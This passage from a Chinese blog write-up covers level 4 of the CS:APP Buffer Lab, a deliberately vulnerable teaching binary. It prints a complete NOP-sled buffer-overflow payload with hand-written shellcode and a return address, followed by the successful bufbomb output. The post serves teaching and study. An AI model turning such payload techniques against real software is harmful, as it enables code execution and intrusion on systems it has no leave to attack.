-<p>同时也能得到testn函数的%ebp值:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x55683480</div><div class="line">0x55683460</div><div class="line">0x55683430</div><div class="line">0x55683410</div><div class="line">0x55683410</div></pre></td></tr></table></figure></p>
-<p>看出getbufn的<code>%ebp</code>值比testn的<code>%ebp</code> 小 0x30.</p>
-<p>我们还有一件最后的事要做：寻找getbufn返回时跳转的合适地址，确保在栈随机的情况下的每次跳转都能执行我们的攻击代码。</p>
-<p>根据调试得到的信息，我们得到一张图：</p>
-<p><img src="/images/CSAPP-BufferLab-08.png" alt="level-4"></p>
-<p>我们可以</p>
-<p>我们将最高的buf地址<code>0x55683248</code>作为跳转地址，将有效机器代码置于跳转地址之前，并将其它所有字符都用作nop指令，此时所有五个buf地址的写入都能满足跳转到地址<code>0x55683248</code>后顺利到达有效机器代码。</p>
-<p>所以我们构造的攻击字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 8d</div><div class="line">6c 24 28 a1 e4 c1 04 08 68 2e </div><div class="line">8c 04 08 c3 48 32 68 55</div></pre></td></tr></table></figure></p>
-<p>执行结果:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level4.txt | ./hex2raw -n | ./bufbomb -u xzz -n</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个实验还是挺有趣的。一步步下来，通过反汇编、gdb调试，然后研究反汇编代码发现漏洞，这个过程充满乐趣又有挑战性。实验中，充分理解IA-32的栈帧结构以及过程调用的机制。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用&lt;code&gt;缓冲区溢出漏洞&lt;/code&gt;生成
-    
-    </summary>
-    
-      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
-    
-    
-      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
     
   </entry>
   
